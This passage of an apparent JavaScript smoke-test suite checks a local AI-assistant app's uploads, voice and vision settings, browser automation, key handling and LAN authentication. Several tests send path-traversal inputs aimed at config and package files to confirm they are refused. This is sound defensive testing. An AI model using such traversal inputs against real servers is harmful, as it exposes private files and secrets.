    const saveCall = turn.events.find((e) => e.type === 'tool.call' && e.name === 'skill_save');
    check('skill_save was called', Boolean(saveCall));
    check('skill_save is MEDIUM risk', saveCall?.risk === 'MEDIUM', saveCall?.risk);
    check('researcher auto-approved MEDIUM without a card', saveCall?.decision === 'auto', saveCall?.decision);
  } finally {
    stream.close();
  }

  const after = await api('/api/skills');
  check('new skill appears in the shared library', after.json.some((s) => s.slug === 'inbox-triage'), after.json.map((s) => s.slug).join(','));
  const saved = await api('/api/skills/inbox-triage');
  check('saved skill has the required frontmatter', saved.status === 200 && saved.json.skill.steps.length >= 3 && Boolean(saved.json.skill.approval_notes));
}

async function scenarioAttachmentsAndVoice() {
  // Attachments: upload, read back, reference in a message.
  const up = await fetch(`${base}/api/uploads`, {
    method: 'POST',
    headers: { 'content-type': 'text/plain', 'x-file-name': encodeURIComponent('笔记.txt') },
    body: 'hello attachment',
  });
  const upJson = await up.json();
  check('upload: stored under uploads/<date>/', up.ok && /^uploads\/\d{4}-\d{2}-\d{2}\/笔记\.txt$/.test(upJson.path), JSON.stringify(upJson));
  const back = await fetch(`${base}/api/workspace/file?path=${encodeURIComponent(upJson.path)}`);
  check('upload: reads back as a download', back.ok && (await back.text()) === 'hello attachment' && /attachment/.test(back.headers.get('content-disposition') || ''));
  const outside = await fetch(`${base}/api/workspace/file?path=${encodeURIComponent('../config/settings.json')}`);
  check('workspace file: refuses paths outside the workspace', outside.status === 400);
  const fake = await api('/api/bots/chief/message', { method: 'POST', body: { text: 'hi', attachments: [{ path: 'config/settings.json' }] } });
  check('message: only uploaded files can be attached', fake.status === 400 && fake.json?.error?.code === 'BAD_ATTACHMENT');

  // Voice: a fake OpenAI-compatible /audio/transcriptions.
  const seen = [];
  const stt = http.createServer((req, res) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      const body = Buffer.concat(chunks).toString('latin1');
      seen.push({ url: req.url, auth: req.headers.authorization, type: req.headers['content-type'], body });
      if (req.headers.authorization !== 'Bearer voice-key') { res.writeHead(401, { 'content-type': 'application/json' }); res.end('{"error":{"message":"bad key"}}'); return; }
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ text: '<|zh|><|NEUTRAL|>帮我看看磁盘' }));
    });
  });
  await new Promise((r) => stt.listen(0, '127.0.0.1', r));
  try {
    const before = await api('/api/voice');
    check('voice: mock chat provider means not available yet', before.status === 200 && before.json.available === false && before.json.hasKey === false);
    const notReady = await fetch(`${base}/api/voice/transcribe`, { method: 'POST', headers: { 'content-type': 'audio/webm' }, body: Buffer.from('abc') });
    check('voice: transcribe without a service says so', notReady.status === 409);
    const sttUrl = `http://127.0.0.1:${stt.address().port}/v1`;
    const saved = await api('/api/voice', { method: 'PUT', body: { baseUrl: sttUrl, model: 'stt-1', apiKey: 'voice-key' } });
    check('voice: own settings make it available, key never returned', saved.status === 200 && saved.json.available && saved.json.source === 'own' && saved.json.hasKey && !JSON.stringify(saved.json).includes('voice-key'));
    const tr = await fetch(`${base}/api/voice/transcribe`, { method: 'POST', headers: { 'content-type': 'audio/webm;codecs=opus' }, body: Buffer.from('fake-opus-bytes') });
    const trJson = await tr.json();
    check('voice: transcription comes back, tags stripped', tr.ok && trJson.text === '帮我看看磁盘', JSON.stringify(trJson));
    const call = seen.at(-1);
    check('voice: multipart to /audio/transcriptions with file + model', call?.url === '/v1/audio/transcriptions' && call.type.includes('multipart/form-data') && call.body.includes('name="model"\r\n\r\nstt-1') && call.body.includes('filename="voice.webm"') && call.body.includes('fake-opus-bytes'));
    await api('/api/voice', { method: 'PUT', body: { apiKey: 'wrong' } });
    const denied = await fetch(`${base}/api/voice/transcribe`, { method: 'POST', headers: { 'content-type': 'audio/webm' }, body: Buffer.from('x') });
    const deniedJson = await denied.json();
    check('voice: a rejected key is reported, not swallowed', denied.status === 502 && /Key/.test(deniedJson.error?.message || ''));
    const empty = await fetch(`${base}/api/voice/transcribe`, { method: 'POST', headers: { 'content-type': 'audio/webm' } });
    check('voice: empty recording is rejected', empty.status === 400);
    // Vision: who pays, what is sent, and the settings round trip.
    const vis = await import('../src/vision.mjs');
    const own = vis.resolveVision({ apiKey: 'v-own', baseUrl: '', model: '' }, {});
    const viaVoice = vis.resolveVision({}, { voice: { apiKey: 'sf-key', baseUrl: '' } });
    const viaChat = vis.resolveVision({}, { settings: { provider: 'openai', baseUrl: 'https://api.openai.com/v1' }, chatKey: 'c-key' });
    const none = vis.resolveVision({}, { settings: { provider: 'deepseek' }, chatKey: 'd-key', voice: { apiKey: 'x', baseUrl: 'https://api.openai.com/v1' } });
    check('vision: own key wins, SiliconFlow voice key next, then a vision-capable chat provider',
      own?.source === 'own' && own.model === 'Qwen/Qwen3-VL-8B-Instruct'
      && viaVoice?.source === 'voice' && viaVoice.apiKey === 'sf-key' && /siliconflow/.test(viaVoice.baseUrl)
      && viaChat?.source === 'model' && viaChat.model === 'gpt-4o-mini' && none === null);
    let sent = null;
    const fakeFetch = async (url, opts) => { sent = { url, body: JSON.parse(opts.body), auth: opts.headers.authorization }; return new Response(JSON.stringify({ choices: [{ message: { content: '一只猫' } }] }), { status: 200 }); };
    const looked = await vis.describeImage(own, Buffer.from('png-bytes'), 'image/png', '这是什么？', { fetchImpl: fakeFetch });
    const parts = sent?.body?.messages?.[0]?.content || [];
    check('vision: image goes as a data URL with the question, answer comes back', looked.text === '一只猫' && sent.url.endsWith('/chat/completions') && sent.auth === 'Bearer v-own' && parts[0]?.image_url?.url?.startsWith('data:image/png;base64,') && parts[1]?.text === '这是什么？');
    let visErr = null;
    try { await vis.describeImage(own, Buffer.from('x'), 'image/png', '', { fetchImpl: async () => new Response('{"error":{"message":"bad key"}}', { status: 401 }) }); } catch (err) { visErr = err; }
    check('vision: a rejected key is reported in plain words', visErr?.code === 'VISION_FAILED' && /密钥无效/.test(visErr.message));
    {
      // N3: pictures are shrunk before they go to the vision model (long side <= 1568, JPEG).
      const fit = await import('../src/imagefit.mjs');
      const zlib = await import('node:zlib');
      const crcTable = Array.from({ length: 256 }, (_, n) => { let c = n; for (let k = 0; k < 8; k += 1) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; return c >>> 0; });
      const crc = (buf) => { let c = 0xffffffff; for (const b of buf) c = crcTable[(c ^ b) & 255] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; };
      const makePng = (w, h, ct = 2) => {
        const ch = ct === 6 ? 4 : 3;
        const raw = Buffer.alloc(h * (w * ch + 1));
        for (let y = 0; y < h; y += 1) for (let x = 0; x < w; x += 1) {
          const o = y * (w * ch + 1) + 1 + x * ch;
          raw[o] = (x * 7) & 255; raw[o + 1] = (y * 3) & 255; raw[o + 2] = ((x + y) >> 2) & 255; if (ch === 4) raw[o + 3] = 255;
        }
        const chunk = (type, data) => { const l = Buffer.alloc(4); l.writeUInt32BE(data.length); const td = Buffer.concat([Buffer.from(type), data]); const c = Buffer.alloc(4); c.writeUInt32BE(crc(td)); return Buffer.concat([l, td, c]); };
        const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = ct;
        return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk('IHDR', ihdr), chunk('IDAT', zlib.deflateSync(raw)), chunk('IEND', Buffer.alloc(0))]);
      };
      const big = fit.fitForVision(makePng(1080, 2400), 'image/png');
      const isJpeg = (b) => b[0] === 0xff && b[1] === 0xd8;
      check('N3 image: a 1080x2400 PNG screenshot goes to the vision model as a 706x1568 JPEG', big.changed && big.mime === 'image/jpeg' && isJpeg(big.bytes) && big.to.w === 706 && big.to.h === 1568, JSON.stringify(big.to));
      const photo = fit.fitForVision(fit.fitForVision(makePng(4000, 3000, 6), 'image/png', { maxSide: 4000 }).bytes, 'image/jpeg');
      check('N3 image: a large JPEG photo is decoded and shrunk too (long side 1568)', photo.changed && photo.from.w === 4000 && photo.to.w === 1568 && photo.to.h === 1176, JSON.stringify([photo.from, photo.to]));
      const small = fit.fitForVision(makePng(800, 600), 'image/png');
      const junk = fit.fitForVision(Buffer.from('not a picture'), 'image/png');
      const gif = fit.fitForVision(Buffer.from('GIF89a...'), 'image/gif');
      check('N3 image: small pictures, other formats and anything unreadable go as they are', !small.changed && small.mime === 'image/png' && !junk.changed && junk.bytes.toString() === 'not a picture' && !gif.changed);
      const visSrc = await readText('../src/vision.mjs');
      const toolSrc = await readText('../src/tools.mjs');
      check('N3 image: image_view sends the shrunk picture and reports size and seconds; short default answer; 8B is the default, 32B selectable', toolSrc.includes('const fit = fitForVision(bytes, mime);') && toolSrc.includes('await describeImage(service, fit.bytes, fit.mime, args.question)') && toolSrc.includes('seconds: Math.round(seen.latencyMs / 100) / 10') && visSrc.includes('300 字以内') && visSrc.includes("model: 'Qwen/Qwen3-VL-8B-Instruct'") && visSrc.includes("id: 'siliconflow-32b'") && visSrc.includes('timeoutMs = 150000'));
    }
    const vGet = await api('/api/vision');
    const vPut = await api('/api/vision', { method: 'PUT', body: { baseUrl: 'https://example.test/v1', model: 'vl-1', apiKey: 'vision-secret' } });
    check('vision settings: saved, available, key never returned', vGet.status === 200 && vPut.status === 200 && vPut.json.available && vPut.json.source === 'own' && vPut.json.model === 'vl-1' && !JSON.stringify(vPut.json).includes('vision-secret'));
    await api('/api/vision', { method: 'PUT', body: { apiKey: '' } });
    const cleared = await api('/api/voice', { method: 'PUT', body: { apiKey: '' } });
    check('voice: clearing the key turns it off again', cleared.status === 200 && cleared.json.available === false);
  } finally {
    stt.close();
  }
}

async function scenarioErrors() {
  const missing = await api('/api/nope');
  check('unknown route returns 404 JSON error shape', missing.status === 404 && missing.json?.error?.code === 'NOT_FOUND');

  const badBot = await api('/api/bots/ghost/message', { method: 'POST', body: { text: 'hi' } });
  check('unknown bot returns 404 with an error code', badBot.status === 404 && badBot.json?.error?.code === 'BOT_NOT_FOUND');

  const empty = await api('/api/bots/chief/message', { method: 'POST', body: { text: '   ' } });
  check('empty message is rejected with 400', empty.status === 400 && empty.json?.error?.code === 'EMPTY_MESSAGE');

  const badJson = await fetch(`${base}/api/bots`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: '{ this is not json',
  });
  const badJsonBody = await badJson.json().catch(() => null);
  check('malformed JSON body is rejected with 400', badJson.status === 400 && badJsonBody?.error?.code === 'BAD_JSON', String(badJson.status));

  const traversal = await fetch(`${base}/%2e%2e/package.json`);
  check('static server refuses path traversal', traversal.status === 403 || traversal.status === 404, `status ${traversal.status}`);
}

// ---------------------------------------------------------------------------
// settings, auth, pairing, streaming, crash recovery
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// browser automation: a real Chromium driven over CDP against a local page
// ---------------------------------------------------------------------------

/**
 * Everything here talks to a live browser. The page under test is served from
 * this process on loopback, so the run never depends on the network.
 *
 * If the machine genuinely has no Chromium installed, the live assertions are
 * skipped (and the graceful not_configured path is still proven) rather than
 * failing a smoke run on a box that simply cannot do browser automation.
 */
async function scenarioBrowser({ toolsMod, browserMod, home }) {
  const PAYLOAD = 'assist-download-payload-0123456789\n';
  const PAGE = [
    '<!doctype html><html><head><title>Assist Browser Test</title>',
    '<style>body{font-family:sans-serif}.hidden{display:none}</style></head><body>',
    '<h1>Browser test page</h1>',
    '<p id="intro">This page exists so the assistant can prove it really clicked.</p>',
    '<button id="go">Click me</button>',
    '<p id="out">not clicked</p>',
    '<input id="name" placeholder="Your name" />',
    '<button id="hidden-btn" class="hidden">invisible</button>',
    '<a id="dl" href="/report.txt">Download report</a>',
    '<script>document.getElementById("go").addEventListener("click", function () {',
    '  document.getElementById("out").textContent = "clicked!";',
    '});</script>',
    '<script>window.__secret_marker__ = "do-not-leak";</script>',
    '</body></html>',
  ].join('\n');

  const testServer = http.createServer((req, res) => {
    const url = new URL(req.url, 'http://127.0.0.1');
    if (url.pathname === '/report.txt') {
      res.writeHead(200, {
        'content-type': 'text/plain',
        'content-disposition': 'attachment; filename="report.txt"',
        'content-length': Buffer.byteLength(PAYLOAD),
      });
      res.end(PAYLOAD);
      return;
    }
    if (url.pathname === '/other') {
      res.writeHead(200, { 'content-type': 'text/html' });
      res.end('<!doctype html><html><head><title>Other page</title></head><body><h1>other</h1><button id="b2">two</button></body></html>');
      return;
    }
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end(PAGE);
  });
  await new Promise((resolve) => testServer.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${testServer.address().port}`;

  const workspaceDir = path.join(home, 'workspace');
  const registry = toolsMod.createRegistry({
    workspaceDir,
    config: { policy: {} },
    getRuntime: () => {
      throw new Error('agent runtime is not needed for the browser stage');
    },
    getRoutines: () => {
      throw new Error('routines are not needed for the browser stage');
    },
  });
  const ctx = { workspaceDir, bot: { id: 'researcher' }, turnId: 'smoke-browser' };
  const call = (name, args = {}) => registry.get(name).run(args, ctx);

  const saved = {
    chromePath: process.env.CHROME_PATH,
    headless: process.env.BROWSER_HEADLESS,
    allowPrivate: process.env.ALLOW_PRIVATE,
  };

  // Headless so the smoke run does not throw windows over the user's desktop;
  // windowed is the product default and is asserted separately below.
  process.env.BROWSER_HEADLESS = '1';
  process.env.ALLOW_PRIVATE = '1'; // the test page is on loopback
  delete process.env.CHROME_PATH; // exercise real auto-detection

  try {
    // --- registration + launch flags (no browser needed) ------------------
    const browserTools = registry.all().filter((t) => t.name.startsWith('browser_')).map((t) => t.name);
    check(
      'browser: all nine browser tools are registered',
      ['browser_open', 'browser_snapshot', 'browser_click', 'browser_type', 'browser_screenshot',
        'browser_download', 'browser_eval', 'browser_close', 'browser_status'].every((n) => browserTools.includes(n)),
      browserTools.join(','),
    );

    const risks = Object.fromEntries(
      registry.all().filter((t) => t.name.startsWith('browser_')).map((t) => [t.name, t.risk]),
    );
    check(
      'browser: risk levels match the spec (LOW/MEDIUM/HIGH)',
      risks.browser_open === 'LOW' && risks.browser_snapshot === 'LOW' && risks.browser_click === 'MEDIUM' &&
        risks.browser_type === 'MEDIUM' && risks.browser_screenshot === 'LOW' && risks.browser_download === 'MEDIUM' &&
        risks.browser_eval === 'HIGH' && risks.browser_close === 'LOW' && risks.browser_status === 'LOW',
      JSON.stringify(risks),
    );

    check(
      'browser: granting browser_open grants the browser family',
      registry.isGranted({ tools: ['browser_open'] }, 'browser_click') === true &&
        registry.isGranted({ tools: ['fs_read'] }, 'browser_click') === false,
    );

    const windowedArgs = browserMod.buildLaunchArgs({ port: 1, profileDir: 'profile', headless: false });
    const headlessArgs = browserMod.buildLaunchArgs({ port: 1, profileDir: 'profile', headless: true });
    check('browser: windowed by default (no --headless flag)', !windowedArgs.some((a) => a.startsWith('--headless')));
    check('browser: BROWSER_HEADLESS=1 adds --headless=new', headlessArgs.includes('--headless=new'));
    check(
      'browser: launch args keep the profile and disable automation hints',
      headlessArgs.includes('--user-data-dir=profile') &&
        headlessArgs.includes('--no-first-run') &&
        headlessArgs.includes('--disable-blink-features=AutomationControlled'),
    );
    check(
      'browser: the profile lives under <data>/browser-profile',
      browserMod.profileDir().split(path.sep).join('/').endsWith('/data/browser-profile'),
      browserMod.profileDir(),
    );
    check(
      'browser: the private-host guard knows LAN vs public hosts',
      browserMod.isPrivateHostname('http://192.168.1.5/') === true &&
        browserMod.isPrivateHostname('http://localhost:3000/') === true &&
        browserMod.isPrivateHostname('https://example.com/') === false,
    );

    const detection = browserMod.detectBrowserExecutable();
    const support = browserMod.browserSupport();
    check('browser: Node has a global WebSocket for CDP', support.supported === true, support.reason || '');

    if (!detection.path) {
      skip('browser live automation', 'no Chromium-based browser is installed on this machine');
      const missing = await call('browser_open', { url: 'https://example.com' });
      check(
        'browser_open: no installed browser returns a structured not_configured',
        missing.ok === false && missing.error?.code === 'not_configured',
        JSON.stringify(missing).slice(0, 160),
      );
      return;
    }

    check(
      'browser: auto-detects the installed Chromium (CHROME_PATH unset)',
      detection.source === 'auto-detect' && /chrome\.exe$|msedge\.exe$|chrome$|chromium|msedge$/i.test(detection.path),
      `${detection.source}: ${detection.path}`,
    );

    const before = await call('browser_status');
    check('browser_status: not running before the first call', before.ok === true && before.running === false);
    check('browser_status: reports the detected executable and profile', Boolean(before.executable) && before.profileDir.includes('browser-profile'));

    // --- open --------------------------------------------------------------
    const opened = await call('browser_open', { url: `${origin}/` });
    check('browser_open: returns the page title', opened.ok === true && opened.title === 'Assist Browser Test', JSON.stringify(opened).slice(0, 200));
    check('browser_open: returns the final url', opened.ok === true && String(opened.url).startsWith(origin));
    check(
      'browser_open: reports the live browser (pid, profile, headless flag)',
      Number.isInteger(opened.browser?.pid) && opened.browser.pid > 0 && opened.browser.headless === true,
      JSON.stringify(opened.browser || {}).slice(0, 160),
    );

    // --- snapshot ------------------------------------------------------------
    const snap = await call('browser_snapshot');
    check('browser_snapshot: returns visible text and elements', snap.ok === true && snap.text.length > 0 && Array.isArray(snap.elements));
    check('browser_snapshot: strips <script> content from the text', !snap.text.includes('do-not-leak'), 'script leaked into the page text');
    check('browser_snapshot: keeps human-visible copy', snap.text.includes('Browser test page'));

    const buttonEl = snap.elements.find((e) => e.tag === 'button' && e.name === 'Click me');
    const inputEl = snap.elements.find((e) => e.tag === 'input');
    const linkEl = snap.elements.find((e) => e.tag === 'a');
    check('browser_snapshot: interactive elements carry a stable ref', /^@e\d+$/.test(buttonEl?.ref || ''), buttonEl?.ref);
    check('browser_snapshot: the input is described as a textbox', inputEl?.role === 'textbox', inputEl?.role);
    check('browser_snapshot: the link is described as a link', linkEl?.role === 'link' && linkEl?.visible === true);
    check('browser_snapshot: hidden elements are not listed', !snap.elements.some((e) => e.name === 'invisible'));

    // --- click ---------------------------------------------------------------
    const clicked = await call('browser_click', { ref: buttonEl.ref });
    check('browser_click: clicks an element by snapshot ref', clicked.ok === true, JSON.stringify(clicked).slice(0, 200));
    const afterClick = await call('browser_eval', { expression: 'document.getElementById("out").textContent' });
    check('browser_click: the page really changed', afterClick.ok === true && afterClick.value === 'clicked!', JSON.stringify(afterClick).slice(0, 160));

    // --- type -----------------------------------------------------------------
    const typed = await call('browser_type', { ref: inputEl.ref, text: 'Ada Lovelace' });
    check('browser_type: types into the field', typed.ok === true && typed.value === 'Ada Lovelace', JSON.stringify(typed).slice(0, 200));
    const readBack = await call('browser_eval', { expression: 'document.getElementById("name").value' });
    check('browser_type: the DOM holds the typed value', readBack.ok === true && readBack.value === 'Ada Lovelace');

    const typedBySelector = await call('browser_type', { selector: '#name', text: 'Grace Hopper' });
    check('browser_type: accepts a CSS selector too', typedBySelector.ok === true && typedBySelector.value === 'Grace Hopper', JSON.stringify(typedBySelector).slice(0, 160));

    // --- screenshot -------------------------------------------------------------
    const shot = await call('browser_screenshot');
    check('browser_screenshot: writes to workspace/artifacts', shot.ok === true && /^artifacts\/.+\.png$/.test(shot.path || ''), shot.path);
    const png = shot.ok ? await fsp.readFile(shot.absolutePath).catch(() => null) : null;
    check(
      'browser_screenshot: the file is a real PNG (magic bytes)',
      Boolean(png) && png.length > 1000 && png.subarray(0, 8).toString('hex') === '89504e470d0a1a0a',
      png ? `${png.length} bytes` : 'no file',
    );
    const escape = await call('browser_screenshot', { path: '../escape.png' });
    check(
      'browser_screenshot: refuses a path outside the workspace',
      escape.ok === false && escape.error?.code === 'SCREENSHOT_PATH_OUTSIDE',
      JSON.stringify(escape).slice(0, 160),
    );

    // --- download ---------------------------------------------------------------
    const download = await call('browser_download', { url: `${origin}/report.txt` });
    check('browser_download: saves the file through the browser', download.ok === true && download.bytes === Buffer.byteLength(PAYLOAD), JSON.stringify(download).slice(0, 200));
    const downloadedBytes = download.ok ? await fsp.readFile(download.absolutePath).catch(() => null) : null;
    check('browser_download: bytes on disk match the served payload', downloadedBytes?.toString('utf8') === PAYLOAD);
    check('browser_download: reports a workspace-relative path', typeof download.path === 'string' && download.path.startsWith('downloads/'));

    const named = await call('browser_download', { url: `${origin}/report.txt`, path: 'downloads/my-report.txt' });
    check(
      'browser_download: honours an explicit destination path',
      named.ok === true && named.path === 'downloads/my-report.txt' && named.bytes === Buffer.byteLength(PAYLOAD),
      JSON.stringify(named).slice(0, 200),
    );

    // --- stale refs ---------------------------------------------------------------
    const navigated = await call('browser_open', { url: `${origin}/other` });
    check('browser_open: can navigate to a second page', navigated.ok === true && navigated.title === 'Other page');
    const stale = await call('browser_click', { ref: buttonEl.ref });
    check(
      'browser_click: a ref from a previous page fails gracefully with STALE_REF',
      stale.ok === false && stale.error?.code === 'STALE_REF',
      JSON.stringify(stale).slice(0, 200),
    );

    // --- status + close --------------------------------------------------------------
    const running = await call('browser_status');
    check(
      'browser_status: reports running with a pid and a cdp url',
      running.running === true && running.pid > 0 && /^http:\/\/127\.0\.0\.1:\d+$/.test(running.cdpUrl || ''),
      JSON.stringify(running).slice(0, 200),
    );
    const closed = await call('browser_close');
    check('browser_close: stops the browser process', closed.ok === true && closed.closed === true);
    const afterClose = await call('browser_status');
    check('browser_status: not running after close', afterClose.running === false);

    // --- runtime without a native WebSocket ---------------------------------------------
    // Node >= 22 ships one; Electron's bundled Node 20 does not. The in-repo
    // RFC 6455 client must keep the browser working there, so deleting the
    // global has to be a no-op for the tools, not an error.
    const realWebSocket = globalThis.WebSocket;
    globalThis.WebSocket = undefined;
    let shimResult;
    try {
      shimResult = await call('browser_open', { url: 'https://example.com' });
    } finally {
      globalThis.WebSocket = realWebSocket;
    }
    check(
      'browser: works without a native WebSocket (RFC 6455 shim)',
      shimResult.ok === true && typeof shimResult.title === 'string',
      JSON.stringify(shimResult).slice(0, 200),
    );
  } finally {
    // Never leave a browser behind, even if an assertion above threw.
    await registry.get('browser_close').run({}, ctx).catch(() => {});
    testServer.close();
    if (saved.chromePath === undefined) delete process.env.CHROME_PATH;
    else process.env.CHROME_PATH = saved.chromePath;
    if (saved.headless === undefined) delete process.env.BROWSER_HEADLESS;
    else process.env.BROWSER_HEADLESS = saved.headless;
    if (saved.allowPrivate === undefined) delete process.env.ALLOW_PRIVATE;
    else process.env.ALLOW_PRIVATE = saved.allowPrivate;
  }
}

async function scenarioSettings({ settingsMod }) {
  const initial = await api('/api/settings');
  check('GET /api/settings returns 200', initial.status === 200, initial.text.slice(0, 200));
  const settings = initial.json || {};
  check('settings expose the app name and version', Boolean(settings.app?.name) && Boolean(settings.app?.version), JSON.stringify(settings.app));
  check(
    'settings start in mock mode with no key',
    settings.model?.provider === 'mock' && settings.model?.hasKey === false,
    JSON.stringify(settings.model),
  );
  check(
    'settings expose an OpenAI-compatible endpoint and model name',
    typeof settings.model?.baseUrl === 'string' && settings.model.baseUrl.startsWith('http') && typeof settings.model?.model === 'string',
  );
  check(
    'settings expose server + pairing details',
    typeof settings.server?.host === 'string' &&
      typeof settings.server?.port === 'number' &&
      typeof settings.server?.requireAuth === 'boolean' &&
      Boolean(settings.pairing?.url) &&
      Boolean(settings.pairing?.code),
    JSON.stringify({ server: settings.server, pairing: settings.pairing }),
  );
  check('settings never contain key material', !initial.text.includes('sk-') && !initial.text.includes('apiKey'));

  const secret = 'sk-smoke-DO-NOT-LEAK-42';
  const put = await api('/api/settings', {
    method: 'PUT',
    body: { provider: 'openai', baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini', apiKey: secret },
  });
  check('PUT /api/settings accepts a provider and a key', put.status === 200 && put.json?.ok === true, put.text.slice(0, 200));
  check(
    'PUT reports hasKey but never echoes the key',
    put.json?.model?.hasKey === true && !put.text.includes(secret) && !put.text.includes('sk-'),
    put.text.slice(0, 200),
  );

  const after = await api('/api/settings');
  check('GET /api/settings now reports hasKey', after.json?.model?.hasKey === true);
  check('the API key never crosses the API', !after.text.includes(secret) && !after.text.includes('sk-'));
  check(
    'provider, baseUrl and model are persisted as given',
    after.json?.model?.provider === 'openai' &&
      after.json?.model?.baseUrl === 'https://api.openai.com/v1' &&
      after.json?.model?.model === 'gpt-4o-mini',
    JSON.stringify(after.json?.model),
  );

  const rawSettings = await fsp.readFile(path.join(home, 'config', 'settings.json'), 'utf8').catch(() => '');
  const rawSecrets = await fsp.readFile(path.join(home, 'data', 'secrets.json'), 'utf8').catch(() => '');
  check('config/settings.json holds provider/baseUrl/model', /"provider": "openai"/.test(rawSettings) && /"model": "gpt-4o-mini"/.test(rawSettings), rawSettings.slice(0, 160));
  check('the key is not in config/settings.json', !rawSettings.includes(secret));
  check('the key lives only in data/secrets.json', rawSecrets.includes(secret));

  const cleared = await api('/api/settings', {
    method: 'PUT',
    body: { provider: 'openai', baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini', apiKey: '' },
  });
  check('an empty apiKey clears the stored key', cleared.status === 200 && cleared.json?.model?.hasKey === false, cleared.text.slice(0, 200));
  const secretsAfter = await fsp.readFile(path.join(home, 'data', 'secrets.json'), 'utf8').catch(() => '');
  check('clearing the key removes it from disk', !secretsAfter.includes(secret));

  const badProvider = await api('/api/settings', { method: 'PUT', body: { provider: 'not-a-provider' } });
  check('an unknown provider is rejected with 400', badProvider.status === 400 && badProvider.json?.error?.code === 'INVALID_PROVIDER', badProvider.text.slice(0, 200));
  const badUrl = await api('/api/settings', { method: 'PUT', body: { baseUrl: 'ftp://example.com' } });
  check('a non-http baseUrl is rejected with 400', badUrl.status === 400 && badUrl.json?.error?.code === 'INVALID_BASE_URL', badUrl.text.slice(0, 200));

  const mockTest = await api('/api/settings/test', { method: 'POST', body: {} });
  check(
    'POST /api/settings/test reports mock mode without a network call',
    mockTest.status === 200 && mockTest.json?.ok === true && mockTest.json?.mode === 'mock' && typeof mockTest.json?.latencyMs === 'number',
    mockTest.text.slice(0, 200),
  );

  // The shipped UI tries { model: {...} } first and falls back to the flat body;
  // both shapes have to mean exactly the same thing.
  const nested = await api('/api/settings', {
    method: 'PUT',
    body: { model: { provider: 'mock', baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini', apiKey: 'sk-nested-DO-NOT-LEAK' } },
  });
  check(
    'PUT /api/settings also accepts the nested {model:{...}} shape',
    nested.status === 200 && nested.json?.model?.hasKey === true && !nested.text.includes('sk-nested'),
    nested.text.slice(0, 200),
  );
  const nestedClear = await api('/api/settings', { method: 'PUT', body: { model: { apiKey: '' } } });
  check('a nested apiKey:"" clears the key too', nestedClear.status === 200 && nestedClear.json?.model?.hasKey === false, nestedClear.text.slice(0, 200));
  const emptyBody = await api('/api/settings', { method: 'PUT', body: {} });
  check('an empty settings body is rejected instead of silently doing nothing', emptyBody.status === 400 && emptyBody.json?.error?.code === 'SETTINGS_EMPTY', emptyBody.text.slice(0, 160));
  const nestedTest = await api('/api/settings/test', {
    method: 'POST',
    body: { model: { provider: 'mock', baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini' } },
  });
  check('POST /api/settings/test accepts a nested unsaved override', nestedTest.status === 200 && nestedTest.json?.mode === 'mock', nestedTest.text.slice(0, 160));

  // Leave the installation on the offline provider for the rest of the run.
  const restored = await api('/api/settings', {
    method: 'PUT',
    body: { provider: 'mock', baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini' },
  });
  check('settings can be switched back to mock without a restart', restored.status === 200 && restored.json?.model?.provider === 'mock', restored.text.slice(0, 200));

  check('settings: a real provider without a key falls back to mock', settingsMod.effectiveProvider({ provider: 'openai' }, '') === 'mock');
  check('settings: a real provider with a key is live', settingsMod.effectiveProvider({ provider: 'openai' }, 'sk-test') === 'openai');
  check('settings: hasKey is false for an empty string', settingsMod.hasKey('') === false && settingsMod.hasKey('sk-x') === true);
}

function scenarioAuth({ auth, devicesMod }) {
  const security = { token: 'a'.repeat(24), code: 'c0ffee00' };

  const local = auth.evaluateAuth({ socket: { remoteAddress: '127.0.0.1' }, headers: {} }, security);
  check('auth: loopback is authorized as local', local.authorized === true && local.mode === 'local' && local.required === false, JSON.stringify(local));

  const localV6 = auth.evaluateAuth({ socket: { remoteAddress: '::1' }, headers: {} }, security);
  check('auth: IPv6 loopback is local', localV6.authorized === true && localV6.mode === 'local');

  const mapped = auth.evaluateAuth({ socket: { remoteAddress: '::ffff:127.0.0.1' }, headers: {} }, security);
  check('auth: IPv4-mapped loopback is local', mapped.authorized === true && mapped.mode === 'local');

  const remote = auth.evaluateAuth({ socket: { remoteAddress: '192.168.1.50' }, headers: {} }, security);
  check('auth: a LAN client without credentials is rejected', remote.authorized === false && remote.required === true && remote.mode === 'none', JSON.stringify(remote));

  const bearer = auth.evaluateAuth({ socket: { remoteAddress: '192.168.1.50' }, headers: { authorization: `Bearer ${security.token}` } }, security);
  check('auth: a LAN client with the bearer token is authorized', bearer.authorized === true && bearer.mode === 'token', JSON.stringify(bearer));

  const wrongBearer = auth.evaluateAuth({ socket: { remoteAddress: '192.168.1.50' }, headers: { authorization: 'Bearer nope' } }, security);
  check('auth: a wrong bearer token is rejected', wrongBearer.authorized === false);

  const cookie = auth.evaluateAuth({ socket: { remoteAddress: '192.168.1.50' }, headers: { cookie: `theme=dark; desk_session=${security.token}` } }, security);
  check('auth: a paired cookie is authorized', cookie.authorized === true && cookie.mode === 'cookie', JSON.stringify(cookie));

  const wrongCookie = auth.evaluateAuth({ socket: { remoteAddress: '192.168.1.50' }, headers: { cookie: 'desk_session=wrong' } }, security);
  check('auth: a wrong cookie is rejected', wrongCookie.authorized === false);

  check(
    'auth: the app shell is reachable without a credential',
    ['/', '/index.html', '/manifest.json', '/sw.js', '/offline.html', '/icons/icon-192.png'].every((p) => auth.isPublicShellPath(p)),
  );
  check('auth: API paths are not public shell paths', auth.isPublicShellPath('/api/settings') === false && auth.isPublicShellPath('/api/bots') === false);
  check('auth: /api/auth and /api/pair are exempt from the gate', auth.isAuthExemptPath('GET', '/api/auth') && auth.isAuthExemptPath('POST', '/api/pair'));
